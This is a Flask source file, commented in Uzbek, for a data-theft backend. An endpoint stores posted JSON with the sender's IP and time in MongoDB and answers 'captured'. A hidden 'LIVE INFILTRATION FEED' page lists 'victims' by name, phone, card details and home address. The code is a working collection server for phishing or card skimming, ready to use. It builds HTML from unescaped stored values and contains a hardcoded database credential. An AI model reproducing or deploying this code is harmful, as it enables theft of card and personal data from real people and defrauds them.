from flask import Flask, request, render_template_string, jsonify
from pymongo import MongoClient
from datetime import datetime

app = Flask(__name__)

# 1-bosqichda olgan ulanish kodingizni shu yerga qo'ying
MONGO_URI = "mongodb+srv://admin:parol123@cluster0.abcde.mongodb.net/?retryWrites=true&w=majority"
client = MongoClient(MONGO_URI)
db = client['kiber_loyiha']
collection = db['foydalanuvchilar']

# Visual dizayn (Matrix uslubida)
CSS = """
<style>
    body { background-color: #050505; color: #00ff41; font-family: 'Consolas', monospace; padding: 40px; }
    h1 { border-bottom: 2px solid #00ff41; display: inline-block; padding-bottom: 10px; text-shadow: 0 0 10px #00ff41; }
    table { width: 100%; border-collapse: collapse; margin-top: 30px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); }
    th, td { border: 1px solid #004d1a; padding: 15px; text-align: left; }
    th { background-color: #004d1a; color: #fff; text-transform: uppercase; }
    tr:nth-child(even) { background-color: #0a0a0a; }
    tr:hover { background-color: #111; cursor: crosshair; }
    .status { color: #ff0000; animation: blink 1s infinite; }
    @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
</style>
"""

@app.route('/post-data-api', methods=['POST'])
def get_data():
    data = request.json
    data['ip'] = request.remote_addr
    data['time'] = datetime.now().strftime("%H:%M:%S | %d.%m.%Y")
    collection.insert_one(data)
    return jsonify({"status": "captured"}), 200

@app.route('/view-matrix-883') # Sizning maxfiy visual panelingiz
def view_data():
    victims = list(collection.find().sort("_id", -1))
    
    rows = ""
    for v in victims:
        rows += f"<tr><td>{v.get('name')}</td><td>{v.get('phone')}</td><td>{v.get('card')}</td><td>{v.get('address')}</td><td>{v.get('ip')}</td><td>{v.get('time')}</td></tr>"
    
    html = f"""
    {CSS}
    <h1>[ LIVE INFILTRATION FEED ] <span class="status">● RECORDING</span></h1>
    <table>
        <tr>
            <th>Nishon ismi</th><th>Telefon</th><th>Karta ma'lumoti</th><th>Yashash joyi</th><th>IP Manzil</th><th>Vaqt</th>
        </tr>
        {rows}
    </table>
    """
    return render_template_string(html)

if __name__ == "__main__":
    app.run(debug=True)